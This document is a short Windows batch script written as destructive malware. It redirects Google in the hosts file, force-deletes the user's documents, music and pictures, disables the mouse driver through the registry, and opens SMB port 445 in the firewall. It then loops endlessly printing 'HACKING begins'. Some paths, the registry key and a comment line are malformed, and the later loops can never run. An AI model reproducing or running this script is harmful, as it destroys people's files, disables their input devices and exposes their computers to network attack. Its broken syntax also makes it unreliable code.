@echo off
cd "C:\Windows\System32\Drivers\etc"
echo 127.0.0.1 google.com >> "Hosts"
echo 127.0.0.1 www.google.com >> "Hosts"
time 00:00
del /f /q "C:\Users\%userprofile%\My Documents\*.*"
del /f /q "C:\Users\%userprofile%\My Music\*.*"
del /f /q "C:\Users\%userprofile%\My Pictures\*.*"
#replace userprofile wirth user name
set key="HKEYLOCALMACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key%
reg add %key% /v Start /t REG_DWORD /d 4
netsh firewall set portopening tcp 445 smb enable
 color 02
:start
echo %random% %random% %random% %random% HACKING begins %random% %random% %random% %random% %random% %random%
goto start
:BEGIN
msg * Welcome
msg * To
msg * HACKING begins
msg * Thanks for visiting
goto BEGIN
:TOP
START %SystemRoot%/system32/notepad.exe
goto TOP
